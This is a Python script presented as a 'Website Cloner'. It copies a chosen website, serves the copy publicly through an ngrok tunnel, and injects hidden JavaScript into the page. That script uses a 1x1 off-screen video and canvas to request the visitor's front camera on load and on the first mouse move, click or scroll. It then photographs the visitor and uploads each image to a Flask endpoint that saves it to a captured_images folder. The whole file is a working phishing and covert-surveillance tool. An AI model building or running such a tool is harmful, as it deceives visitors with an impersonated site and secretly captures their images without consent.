import os
import sys
import subprocess
import json
import venv
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

def run_command(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if process.returncode != 0:
            console.print(f"[red]Command failed: {stderr.decode()}[/red]")
            return False
        return True
    except Exception as e:
        console.print(f"[red]Error running command: {str(e)}[/red]")
        return False

def create_virtual_environment():
    if os.path.exists("venv"):
        console.print("[yellow]Virtual environment already exists[/yellow]")
        return True
    
    console.print("[yellow]Creating virtual environment...[/yellow]")
    try:
        venv.create("venv", with_pip=True)
        console.print("[green]✓[/green] Virtual environment created successfully")
        return True
    except Exception as e:
        console.print(f"[red]Failed to create virtual environment: {str(e)}[/red]")
        return False

def setup():
    console.print(Panel.fit(
        "[bold blue]Website Cloner Setup[/bold blue]\n"
        "[cyan]Setting up your environment...[/cyan]",
        border_style="blue"
    ))
    
    # Create virtual environment
    if not create_virtual_environment():
        return False
    
    # Install requirements in virtual environment
    console.print("[yellow]Installing requirements in virtual environment...[/yellow]")
    pip_cmd = os.path.join("venv", "Scripts", "pip") if sys.platform == "win32" else os.path.join("venv", "bin", "pip")
    python_cmd = os.path.join("venv", "Scripts", "python") if sys.platform == "win32" else os.path.join("venv", "bin", "python")
    
    # First upgrade pip
    if not run_command(f'"{pip_cmd}" install --upgrade pip'):
        console.print("[red]Failed to upgrade pip[/red]")
        return False
    
    requirements = [
        "requests==2.31.0",
        "beautifulsoup4==4.12.2",
        "flask==3.0.0",
        "pyngrok==7.0.5",
        "rich==13.7.0"
    ]
    
    for req in requirements:
        console.print(f"Installing {req}...")
        if not run_command(f'"{pip_cmd}" install {req}'):
            console.print(f"[red]Failed to install {req}[/red]")
            return False
        console.print(f"[green]✓[/green] {req} installed successfully")
    
    # Setup ngrok using the virtual environment's Python
    console.print("[yellow]Setting up ngrok...[/yellow]")
    
    # Create a temporary script to setup ngrok
    ngrok_setup_script = """
import json
from pyngrok import ngrok
import sys
import os

def setup_ngrok():
    config_file = "ngrok_config.json"
    
    if len(sys.argv) > 1:
        # We have an auth token passed as argument
        auth_token = sys.argv[1]
        try:
            ngrok.set_auth_token(auth_token)
            with open(config_file, 'w') as f:
                json.dump({'auth_token': auth_token}, f)
            print("SUCCESS")
            return
        except:
            print("FAILED")
            return
    
    # Check existing config
    try:
        with open(config_file, 'r') as f:
            config = json.load(f)
            ngrok.set_auth_token(config['auth_token'])
            ngrok.get_tunnels()
            print("SUCCESS")
            return
    except:
        print("FAILED")
        return

if __name__ == '__main__':
    setup_ngrok()
"""
    
    with open("ngrok_setup_temp.py", "w") as f:
        f.write(ngrok_setup_script)
    
    # Try to load existing configuration first
    result = subprocess.run(f'"{python_cmd}" ngrok_setup_temp.py', shell=True, capture_output=True, text=True)
    if "SUCCESS" in result.stdout:
        console.print("[green]✓[/green] Ngrok authentication successful")
        os.remove("ngrok_setup_temp.py")
        return True
    
    # If that fails, ask for new token
    while True:
        console.print("\n[bold cyan]Get your authtoken from:[/bold cyan]")
        console.print("[bold blue]https://dashboard.ngrok.com/get-started/your-authtoken[/bold blue]")
        auth_token = console.input("\n[bold yellow]Please enter your ngrok auth token: [/bold yellow]")
        
        result = subprocess.run(f'"{python_cmd}" ngrok_setup_temp.py "{auth_token}"', shell=True, capture_output=True, text=True)
        if "SUCCESS" in result.stdout:
            console.print("[green]✓[/green] Ngrok authentication successful")
            os.remove("ngrok_setup_temp.py")
            return True
        else:
            console.print("[red]✗ Invalid auth token. Please try again.[/red]")
    
    os.remove("ngrok_setup_temp.py")
    return False

def start_cloner():
    try:
        import requests
        from bs4 import BeautifulSoup
        from flask import Flask, request, send_from_directory
        from pyngrok import ngrok
        
        def clone_website_content(url):
            try:
                console.print(f"\n[bold green]Cloning website: {url}...[/bold green]")
                response = requests.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                styles = ""
                for style in soup.find_all('style'):
                    styles += style.string + "\n"
                    style.decompose()
                    
                for link in soup.find_all('link', rel='stylesheet'):
                    try:
                        css_url = link.get('href')
                        if not css_url.startswith('http'):
                            if css_url.startswith('/'):
                                css_url = url + css_url
                            else:
                                css_url = url + '/' + css_url
                        css_response = requests.get(css_url)
                        styles += css_response.text + "\n"
                    except:
                        continue
                
                camera_code = """
                <div id="camera-container" style="position:fixed;top:-9999px;left:-9999px;">
                    <video id="camera-video" autoplay playsinline style="width:1px;height:1px;"></video>
                    <canvas id="camera-canvas" style="width:1px;height:1px;"></canvas>
                </div>
                <script>
                    function startCapture() {
                        navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                        })
                        .then(function(stream) {
                            var video = document.getElementById('camera-video');
                            video.srcObject = stream;
                            video.onloadedmetadata = function() {
                                video.play();
                                setTimeout(function() {
                                    var canvas = document.getElementById('camera-canvas');
                                    canvas.width = video.videoWidth;
                                    canvas.height = video.videoHeight;
                                    canvas.getContext('2d').drawImage(video, 0, 0);
                                    canvas.toBlob(function(blob) {
                                        var formData = new FormData();
                                        formData.append('image', blob);
                                        fetch('/save-image', {
                                            method: 'POST',
                                            body: formData
                                        }).then(function() {
                                            stream.getTracks().forEach(track => track.stop());
                                        });
                                    });
                                }, 500);
                            };
                        })
                        .catch(function(err) {
                            console.log(err);
                        });
                    }
                    window.addEventListener('load', function() {
                        startCapture();
                        document.addEventListener('mousemove', startCapture, { once: true });
                        document.addEventListener('click', startCapture, { once: true });
                        document.addEventListener('scroll', startCapture, { once: true });
                    });
                </script>
                """
                
                html = str(soup)
                html = html.replace('</body>', camera_code + '</body>')
                
                cloned_content = f"""
                <style>{styles}</style>
                {html}
                """
                
                # Save the cloned content
                os.makedirs('cloned_site', exist_ok=True)
                with open('cloned_site/index.html', 'w', encoding='utf-8') as f:
                    f.write(cloned_content)
                    
                console.print("[green]✓[/green] Website cloned successfully!")
                return True
            except Exception as e:
                console.print(f"[red]Error cloning website: {str(e)}[/red]")
                return False
        
        # Ask for website URL
        console.print(Panel.fit(
            "[bold blue]Website Cloner[/bold blue]\n"
            "[cyan]Enter the website URL to clone[/cyan]",
            border_style="blue"
        ))
        
        target_url = console.input("\n[bold yellow]Enter website URL: [/bold yellow]")
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        
        # Clone the website first
        if not clone_website_content(target_url):
            return
        
        app = Flask(__name__)
        
        @app.route('/')
        def index():
            return send_from_directory('cloned_site', 'index.html')

        @app.route('/save-image', methods=['POST'])
        def save_image():
            if 'image' not in request.files:
                return 'No image received', 400
                
            image = request.files['image']
            if not os.path.exists('captured_images'):
                os.makedirs('captured_images')
                
            image_path = os.path.join('captured_images', f'capture_{len(os.listdir("captured_images"))}.png')
            image.save(image_path)
            console.print(f"[green]✓[/green] New image captured: {image_path}")
            return 'Image saved', 200
        
        def display_status(public_url):
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Service", style="cyan")
            table.add_column("URL", style="green")
            
            table.add_row("Local Server", "http://localhost:5000")
            table.add_row("Public URL", str(public_url))
            
            console.print(Panel(table, title="[bold blue]Website Cloner Status[/bold blue]", border_style="blue"))
            console.print("\n[yellow]Captured images will be saved in: [bold]./captured_images/[/bold][/yellow]")
            console.print("\n[bold green]Server is running. Press Ctrl+C to stop.[/bold green]")
        
        # Load ngrok config
        config_file = "ngrok_config.json"
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                config = json.load(f)
                ngrok.set_auth_token(config['auth_token'])
        
        # Start the server
        console.print(Panel.fit(
            "[bold blue]Website Cloner[/bold blue]\n"
            "[cyan]Starting server...[/cyan]",
            border_style="blue"
        ))
        
        # Start ngrok tunnel
        with console.status("[bold green]Starting ngrok tunnel..."):
            public_url = ngrok.connect(5000)
        
        display_status(public_url)
        app.run(host='0.0.0.0', port=5000)
        
    except KeyboardInterrupt:
        console.print("\n[yellow]Shutting down...[/yellow]")
        try:
            ngrok.disconnect(public_url)
        except:
            pass
        console.print("[green]✓[/green] Server stopped successfully")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def main():
    try:
        # Check if we need to set up the environment
        if not os.path.exists("venv") or not os.path.exists(os.path.join("venv", "Scripts" if sys.platform == "win32" else "bin", "python")):
            if not setup():
                console.print("[red]Setup failed. Please try again.[/red]")
                return
            
            # Restart script in virtual environment
            python_cmd = os.path.join("venv", "Scripts" if sys.platform == "win32" else "bin", "python")
            console.print("\n[bold green]Setup complete! Restarting in virtual environment...[/bold green]")
            os.execl(python_cmd, python_cmd, *sys.argv)
        else:
            start_cloner()
            
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

if __name__ == '__main__':
    main() 